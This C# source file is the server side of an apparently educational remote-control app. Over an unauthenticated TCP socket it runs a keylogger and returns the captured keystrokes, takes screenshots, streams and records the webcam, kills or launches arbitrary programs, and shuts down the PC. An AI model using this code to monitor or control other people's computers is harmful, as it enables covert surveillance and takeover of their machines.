using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Threading;
using KeyLogger;
using System.Security;
namespace ServerApp
{
    public partial class server : Form
    {
        Thread serverThread; // Luồng chính để chạy Server lắng nghe TCP
        Thread udpDiscoveryThread; // Luồng riêng cho UDP Discovery
        Thread tklog = null; // Luồng riêng cho Keylogger để không chặn UI
        WebcamRecorder.WebcamCapture webcamCapture = null; // Instance cho Webcam
        public server()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false; // Cho phép truy cập UI từ luồng khác (dùng cẩn thận)
            this.FormClosing += new FormClosingEventHandler(server_FormClosing);
            // Xóa file log cũ khi khởi động lại server để tránh file bị phình to
            try
            {
                if (File.Exists(KeyLogger.appstart.path))
                    File.Delete(KeyLogger.appstart.path);
            }
            catch { }
        }

        // Đảm bảo ngắt toàn bộ tiến trình khi đóng Form
        private void server_FormClosing(object sender, FormClosingEventArgs e)
        {
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        // Sự kiện nút "Open Server"
        private void button1_Click(object sender, EventArgs e)
        {
            ((Button)sender).Enabled = false;
            ((Button)sender).Text = "Running...";

            // Chạy TCP Server trên luồng nền (Port 5656)
            serverThread = new Thread(StartServerLoop);
            serverThread.IsBackground = true;
            serverThread.Start();
            
            // --- THÊM MỚI: Chạy UDP Discovery Listener (Port 9999) ---
            udpDiscoveryThread = new Thread(StartUdpDiscoveryListener);
            udpDiscoveryThread.IsBackground = true;
            udpDiscoveryThread.Start();
        }

        // Vòng lặp chính: Lắng nghe kết nối TCP tại Port 5656
        private void StartServerLoop()
        {
            try
            {
                IPEndPoint ip = new IPEndPoint(IPAddress.Any, 5656);
                Program.server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                Program.server.Bind(ip);
                Program.server.Listen(100); // Hàng đợi tối đa 100 kết nối

                while (true)
                {
                    try
                    {
                        // Chấp nhận kết nối từ Client (Python Web Server)
                        Program.client = Program.server.Accept();
                        Program.ns = new NetworkStream(Program.client);
                        Program.nr = new StreamReader(Program.ns);
                        Program.nw = new StreamWriter(Program.ns);
                        Program.nw.AutoFlush = true; // Tự động đẩy dữ liệu đi không cần buffer

                        // Chuyển sang xử lý lệnh
                        HandleClientCommunication();

                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Port 5656 Error: " + ex.Message);
                Environment.Exit(0);
            }
        }

        // Phân tích cú pháp lệnh gửi từ Client
        // File: server.cs - Cập nhật hàm HandleClientCommunication

        private void HandleClientCommunication()
        {
            String s = "";
            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {
                    // --- NHÓM 1: CÁC MODULE CŨ ---
                    case "KEYLOG": keylog(); break;
                    case "PROCESS": process(); break;
                    case "APPLICATION": application(); break;
                    case "TAKEPIC": takepic(); break;
                    case "WEBCAM": webcam(); break;
                    case "SHUTDOWN": Process.Start("ShutDown", "-s"); break;
                    case "RESTART": Process.Start("shutdown", "/r /t 0"); break;
                    case "QUIT": return;
                }
            }
        }

        // Hàm tiện ích để đọc dòng lệnh an toàn
        public void receiveSignal(ref String s)
        {
            try { s = Program.nr.ReadLine(); if (s == null) s = "QUIT"; }
            catch { s = "QUIT"; }
        }

        // --- MODULE KEYLOGGER ---
        public void keylog()
        {
            KeyLogger.appstart.path = Application.StartupPath + @"\keylog_cache.txt";
            String s = "";

            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {
                    case "HOOK": // Bắt đầu ghi phím
                        if (tklog == null || !tklog.IsAlive)
                        {
                            tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
                            tklog.SetApartmentState(ApartmentState.STA);
                            tklog.Start();
                        }
                        break;

                    case "UNHOOK": // Dừng ghi phím
                        if (tklog != null && tklog.IsAlive)
                        {
                            try { tklog.Abort(); } catch { }
                            tklog = null;
                        }
                        break;

                    case "STATUS": // Kiểm tra trạng thái để hiển thị lên Web
                        bool isRunning = (tklog != null && tklog.IsAlive);
                        Program.nw.WriteLine(isRunning ? "RUNNING" : "STOPPED");
                        Program.nw.Flush();
                        break;

                    case "CLEAR": // Xóa file log
                        try { File.WriteAllText(KeyLogger.appstart.path, ""); } catch { }
                        Program.nw.WriteLine("Logs Cleared");
                        Program.nw.Flush();
                        break;

                    case "PRINT": // Đọc file log gửi về Client
                        String log = "";
                        if (File.Exists(KeyLogger.appstart.path))
                        {
                            try
                            {
                                using (FileStream fs = new FileStream(KeyLogger.appstart.path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                using (StreamReader sr = new StreamReader(fs))
                                {
                                    log = sr.ReadToEnd();
                                }
                            }
                            catch { log = "Reading..."; }
                        }
                        if (string.IsNullOrEmpty(log)) log = " ";
                        Program.nw.WriteLine(log);
                        Program.nw.Flush();
                        break;

                    case "QUIT": return;
                }
            }
        }

        // --- MODULE SCREENSHOT ---
        public void takepic()
        {
            String ss = "";
            while (true)
            {
                receiveSignal(ref ss);
                if (ss == "QUIT") return;
                if (ss == "TAKE")
                {
                    try
                    {
                        // 1. Chụp màn hình
                        Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                        Graphics g = Graphics.FromImage(bmp);
                        g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);

                        // Gửi qua mạng về Client để lưu vào Django database
                        MemoryStream ms = new MemoryStream();
                        bmp.Save(ms, ImageFormat.Bmp);
                        byte[] b = ms.ToArray();
                        Program.nw.WriteLine(b.Length.ToString());
                        Program.nw.Flush();
                        Program.client.Send(b);
                    }
                    catch { Program.nw.WriteLine("0"); Program.nw.Flush(); }
                }
            }
        }

        // --- MODULE PROCESS & APPLICATION ---
        // Sử dụng chung logic ProcessHandler để giảm lặp code
        public void application() { ProcessHandler("App"); }
        public void process() { ProcessHandler("All"); }

        private void ProcessHandler(string mode)
        {
            String ss = "";
            while (true)
            {
                receiveSignal(ref ss);
                if (ss == "QUIT") return;

                if (ss == "XEM") // Lấy danh sách
                {
                    Process[] pr = Process.GetProcesses();
                    List<Process> filteredList = new List<Process>();
                    foreach (Process p in pr)
                    {
                        // Nếu mode là App thì chỉ lấy cửa sổ có tiêu đề
                        if (mode == "All" || p.MainWindowTitle.Length > 0) filteredList.Add(p);
                    }

                    // Sắp xếp danh sách
                    if (mode == "App") filteredList = filteredList.OrderBy(p => p.MainWindowTitle).ToList();
                    else filteredList = filteredList.OrderBy(p => p.ProcessName).ToList();

                    // Gửi số lượng trước
                    Program.nw.WriteLine(filteredList.Count.ToString()); Program.nw.Flush();

                    // Gửi chi tiết từng Process
                    foreach (Process p in filteredList)
                    {
                        if (mode == "App") Program.nw.WriteLine(p.MainWindowTitle);
                        else Program.nw.WriteLine(p.ProcessName);
                        Program.nw.Flush();
                        Program.nw.WriteLine(p.Id.ToString()); Program.nw.Flush();
                        Program.nw.WriteLine(p.Threads.Count.ToString()); Program.nw.Flush();
                    }
                }
                else if (ss == "KILL") // Diệt tiến trình
                {
                    receiveSignal(ref ss);
                    if (ss == "KILLID")
                    {
                        string id = Program.nr.ReadLine();
                        try
                        {
                            Process p = Process.GetProcessById(int.Parse(id));
                            string pName = (mode == "App") ? p.MainWindowTitle : p.ProcessName;
                            p.Kill();
                            Program.nw.WriteLine($"Successfully killed: {pName} (ID: {id})");
                        }
                        catch (Exception ex) { Program.nw.WriteLine("Failed: " + ex.Message.Replace("\n", " ")); }
                        Program.nw.Flush();
                    }
                }
                else if (ss == "START") // Mở tiến trình mới
                {
                    receiveSignal(ref ss);
                    if (ss == "STARTID")
                    {
                        string name = Program.nr.ReadLine();
                        try
                        {
                            Process.Start(name);
                            Program.nw.WriteLine("Successfully started: " + name);
                        }
                        catch (Exception ex) { Program.nw.WriteLine("Failed: " + ex.Message.Replace("\n", " ")); }
                        Program.nw.Flush();
                    }
                }
            }
        }

        // === UDP DISCOVERY LISTENER ===
        // Lắng nghe UDP broadcasts từ Python Web Server để tự động discover
        private void StartUdpDiscoveryListener()
        {
            UdpClient udpServer = null;
            try
            {
                // Tạo UDP listener trên Port 9999
                // IPAddress.Any = Lắng nghe trên tất cả network interfaces
                udpServer = new UdpClient(9999);
                
                // Log để debug
                Console.WriteLine("[UDP Discovery] Listening on Port 9999...");
                
                // Endpoint để nhận data từ bất kỳ IP nào
                IPEndPoint remoteEndpoint = new IPEndPoint(IPAddress.Any, 0);
                
                // Vòng lặp vô tận để lắng nghe broadcasts
                while (true)
                {
                    try
                    {
                        // Receive(): Block và chờ đến khi nhận được data
                        // Trả về bytes data và update remoteEndpoint với IP của sender
                        byte[] receivedData = udpServer.Receive(ref remoteEndpoint);
                        
                        // Decode bytes → string
                        string message = Encoding.UTF8.GetString(receivedData);
                        
                        Console.WriteLine($"[UDP Discovery] Received from {remoteEndpoint.Address}: {message}");
                        
                        // Kiểm tra message có đúng là "DISCOVER_SERVER" không
                        if (message.Trim() == "DISCOVER_SERVER")
                        {
                            // Lấy hostname của máy này
                            string hostname = Dns.GetHostName();
                            
                            // Lấy tất cả IP addresses của máy này
                            // Một máy có thể có nhiều IPs (WiFi, LAN, VPN...)
                            IPAddress[] addresses = Dns.GetHostAddresses(hostname);
                            
                            // Lọc chỉ lấy IPv4 addresses (bỏ IPv6)
                            var ipv4Addresses = addresses.Where(ip => ip.AddressFamily == AddressFamily.InterNetwork);
                            
                            // Chọn IP đầu tiên (hoặc có thể chọn IP trong cùng subnet với sender)
                            string serverIp = ipv4Addresses.FirstOrDefault()?.ToString() ?? "Unknown";
                            
                            // === TẠO RESPONSE MESSAGE ===
                            // Format: "HOSTNAME|IP_ADDRESS"
                            // Ví dụ: "DESKTOP-ABC123|192.168.1.10"
                            string response = $"{hostname}|{serverIp}";
                            
                            // Encode string → bytes
                            byte[] responseData = Encoding.UTF8.GetBytes(response);
                            
                            // GỬI RESPONSE LẠI CHO SENDER
                            // Send đến IP và Port của sender (Python Web Server)
                            udpServer.Send(responseData, responseData.Length, remoteEndpoint);
                            
                            Console.WriteLine($"[UDP Discovery] Sent response: {response}");
                        }
                    }
                    catch (Exception ex)
                    {
                        // Log lỗi nhưng không crash thread
                        Console.WriteLine($"[UDP Discovery] Error handling request: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                // Lỗi khi bind port (ví dụ port đã bị sử dụng)
                Console.WriteLine($"[UDP Discovery] Fatal error: {ex.Message}");
                MessageBox.Show($"UDP Discovery Error: {ex.Message}\nPort 9999 may be in use.", 
                               "UDP Discovery Error", 
                               MessageBoxButtons.OK, 
                               MessageBoxIcon.Error);
            }
            finally
            {
                // Cleanup
                if (udpServer != null)
                {
                    udpServer.Close();
                }
            }
        }

        // ==================== MODULE WEBCAM ====================
        /// <summary>
        /// Handler cho WEBCAM module
        /// Commands: ON, OFF, GET_FRAME, START_REC, STOP_REC, STATUS, GET_VIDEO, QUIT
        /// Architecture: Camera ON/OFF riêng biệt với Recording START/STOP
        /// </summary>
        public void webcam()
        {
            String cmd = "";
            
            // Khởi tạo webcam instance nếu chưa có
            if (webcamCapture == null)
            {
                webcamCapture = new WebcamRecorder.WebcamCapture();
            }

            while (true)
            {
                receiveSignal(ref cmd);
                
                switch (cmd)
                {
                    case "ON": // Bật camera (chỉ preview, chưa ghi)
                        {
                            string result = webcamCapture.TurnOn();
                            Program.nw.WriteLine(result);
                            Program.nw.Flush();
                            break;
                        }

                    case "OFF": // Tắt camera
                        {
                            string result = webcamCapture.TurnOff();
                            Program.nw.WriteLine(result);
                            Program.nw.Flush();
                            break;
                        }

                    case "GET_FRAME": // Lấy 1 frame hiện tại (cho streaming)
                        {
                            byte[] frameBytes = webcamCapture.GetCurrentFrameAsJpeg();
                            
                            if (frameBytes != null && frameBytes.Length > 0)
                            {
                                // Gửi size trước, sau đó gửi bytes
                                Program.nw.WriteLine(frameBytes.Length.ToString());
                                Program.nw.Flush();
                                Program.client.Send(frameBytes);
                            }
                            else
                            {
                                // Không có frame
                                Program.nw.WriteLine("0");
                                Program.nw.Flush();
                            }
                            break;
                        }

                    case "START_REC": // Bắt đầu recording
                        {
                            string result = webcamCapture.StartRecording();
                            Program.nw.WriteLine(result);
                            Program.nw.Flush();
                            break;
                        }

                    case "STOP_REC": // Dừng recording, gửi video về Python
                        {
                            string result = webcamCapture.StopRecording();
                            Program.nw.WriteLine(result);
                            Program.nw.Flush();
                            
                            // Nếu stop thành công, gửi file video
                            if (result.StartsWith("RECORDING_STOPPED"))
                            {
                                string[] parts = result.Split('|');
                                if (parts.Length >= 2 && !string.IsNullOrEmpty(parts[1]))
                                {
                                    string filename = parts[1];
                                    byte[] videoBytes = webcamCapture.GetVideoBytes(filename);
                                    
                                    if (videoBytes != null && videoBytes.Length > 0)
                                    {
                                        // Gửi size
                                        Program.nw.WriteLine(videoBytes.Length.ToString());
                                        Program.nw.Flush();
                                        
                                        // Gửi bytes (chia nhỏ chunks nếu file lớn)
                                        int chunkSize = 1024 * 1024; // 1 MB chunks
                                        int offset = 0;
                                        while (offset < videoBytes.Length)
                                        {
                                            int remaining = videoBytes.Length - offset;
                                            int currentChunkSize = Math.Min(chunkSize, remaining);
                                            Program.client.Send(videoBytes, offset, currentChunkSize, System.Net.Sockets.SocketFlags.None);
                                            offset += currentChunkSize;
                                        }
                                    }
                                    else
                                    {
                                        Program.nw.WriteLine("0");
                                        Program.nw.Flush();
                                    }
                                }
                            }
                            break;
                        }

                    case "STATUS": // Kiểm tra trạng thái
                        {
                            string status = webcamCapture.GetStatus();
                            Program.nw.WriteLine(status);
                            Program.nw.Flush();
                            break;
                        }

                    case "GET_VIDEO": // Lấy video cụ thể (by filename)
                        {
                            string filename = Program.nr.ReadLine();
                            byte[] videoBytes = webcamCapture.GetVideoBytes(filename);
                            
                            if (videoBytes != null && videoBytes.Length > 0)
                            {
                                Program.nw.WriteLine(videoBytes.Length.ToString());
                                Program.nw.Flush();
                                
                                // Gửi chunks
                                int chunkSize = 1024 * 1024;
                                int offset = 0;
                                while (offset < videoBytes.Length)
                                {
                                    int remaining = videoBytes.Length - offset;
                                    int currentChunkSize = Math.Min(chunkSize, remaining);
                                    Program.client.Send(videoBytes, offset, currentChunkSize, System.Net.Sockets.SocketFlags.None);
                                    offset += currentChunkSize;
                                }
                            }
                            else
                            {
                                Program.nw.WriteLine("0");
                                Program.nw.Flush();
                            }
                            break;
                        }

                    case "CLEAR": // Xóa tất cả videos
                        {
                            string result = webcamCapture.ClearAllRecordings();
                            Program.nw.WriteLine(result);
                            Program.nw.Flush();
                            break;
                        }

                    case "QUIT": // Thoát module
                        return;
                }
            }
        }
    }
}